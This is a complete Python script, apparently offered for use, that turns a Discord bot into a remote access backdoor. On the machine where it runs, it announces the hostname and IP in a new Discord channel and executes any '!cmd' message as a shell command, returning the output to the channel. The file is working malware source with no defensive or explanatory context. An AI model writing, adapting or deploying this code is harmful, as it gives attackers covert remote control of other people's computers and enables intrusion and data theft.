import discord
import socket
import subprocess


TOKEN = "HERE TOKEN BOT"
ip = socket.gethostbyname(socket.gethostname())
intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

channel_ref = None

def get_hostname():
    return socket.gethostname().lower().replace(" ", "-")

@client.event
async def on_ready():
    global channel_ref

    guild = client.guilds[0]
    name = get_hostname()

    existing = discord.utils.get(guild.channels, name=name)

    if existing:
        channel_ref = existing
    else:
        channel_ref = await guild.create_text_channel(name)

    await channel_ref.send(f"You have access to computer. type !cmd (command) to execute command in cmd. Name: {name} IP: {ip}")

@client.event
async def on_message(message):
    global channel_ref

    if message.author == client.user:
        return

    if channel_ref is None or message.channel.id != channel_ref.id:
        return

    if message.content.startswith("!cmd "):
        cmd = message.content[5:]

        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace"
            )

            output = (result.stdout or result.stderr or "").strip()

            if not output:
                output = "."

            await message.channel.send(f"```\n{output[:1900]}\n```")

        except Exception as e:
            await message.channel.send(f"Error: {e}")

    elif message.content == "!hostname":
        await message.channel.send(get_hostname())

client.run(TOKEN)
